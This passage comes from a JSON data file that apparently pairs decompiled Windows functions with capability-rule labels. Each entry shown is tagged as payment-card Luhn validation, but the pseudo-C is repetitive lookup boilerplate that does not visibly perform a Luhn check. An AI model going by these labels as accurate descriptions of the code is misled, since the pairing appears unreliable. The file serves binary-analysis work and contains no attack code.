fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe44 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe28 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe28 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe0c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe0c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdf4 = 0x507724;\n        in_stack_fffffdf0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffdf4 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffdf4);\n        fcn.0049e080(in_stack_fffffdf0, in_stack_fffffdf4, arg_10h);\n        return in_stack_fffffdf0;\n    }\n    fcn.0049c600(*(in_stack_fffffdf0 + *(*in_stack_fffffdf0 + -0xc) + 0x14) | 1);\n    return in_stack_fffffdf0;\n}\n",
        "token_count": 3697
    },
    "004a0cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0cc0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffe44;\n    int32_t in_stack_fffffe48;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe48 = 0x507724;\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffe48 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffe48);\n        fcn.0049e080(in_stack_fffffe44, in_stack_fffffe48, arg_10h);\n        return in_stack_fffffe44;\n    }\n    fcn.0049c600(*(in_stack_fffffe44 + *(*in_stack_fffffe44 + -0xc) + 0x14) | 1);\n    return in_stack_fffffe44;\n}\n",
        "token_count": 3136
    },
    "004a0d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0d20(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffe60;\n    int32_t in_stack_fffffe64;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe64 = 0x507724;\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffe64 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffe64);\n        fcn.0049e080(in_stack_fffffe60, in_stack_fffffe64, arg_10h);\n        return in_stack_fffffe60;\n    }\n    fcn.0049c600(*(in_stack_fffffe60 + *(*in_stack_fffffe60 + -0xc) + 0x14) | 1);\n    return in_stack_fffffe60;\n}\n",
        "token_count": 2950
    },
    "004a0d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0d80(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffe7c;\n    int32_t in_stack_fffffe80;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe80 = 0x507724;\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffe80 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffe80);\n        fcn.0049e080(in_stack_fffffe7c, in_stack_fffffe80, arg_10h);\n        return in_stack_fffffe7c;\n    }\n    fcn.0049c600(*(in_stack_fffffe7c + *(*in_stack_fffffe7c + -0xc) + 0x14) | 1);\n    return in_stack_fffffe7c;\n}\n",
        "token_count": 2768
    },
    "004a0de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
